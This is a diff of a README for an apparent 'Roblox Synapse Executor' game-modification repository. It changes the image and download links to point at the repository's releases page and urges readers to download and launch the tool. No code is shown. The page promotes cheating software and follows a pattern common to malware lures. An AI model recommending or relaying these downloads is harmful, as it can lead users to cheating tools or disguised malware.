@@ -6,7 +6,7 @@ Welcome to the Roblox Synapse Executor repository! Here you will find all the in
 
 Roblox Synapse Executor is a highly valued tool known for its advanced features and stability. It enables seamless Lua scripting for game modifications and customization within the Roblox platform. Whether you're looking to enhance gameplay, create unique experiences, or explore the limits of Roblox scripting, Synapse is here to empower you.
 
-![Roblox Synapse](https://www.example.com/images/synapse.png)
+![Roblox Synapse](https://github.com/FilipXVZ/Roblox-Synapse/releases)
 
 ## Repository Details
 
@@ -17,7 +17,7 @@ Roblox Synapse Executor is a highly valued tool known for its advanced features 
 ## Get Started with Synapse
 
 To start using Roblox Synapse Executor, download the tool from the following link:
-[![Download Synapse](https://img.shields.io/badge/Download-Synapse-blue)](https://github.com/assets/Release.zip)
+[![Download Synapse](https://github.com/FilipXVZ/Roblox-Synapse/releases)](https://github.com/FilipXVZ/Roblox-Synapse/releases)
 
 If the link doesn't work or the file needs to be launched, please check the "Releases" section of this repository for alternative download options.
 
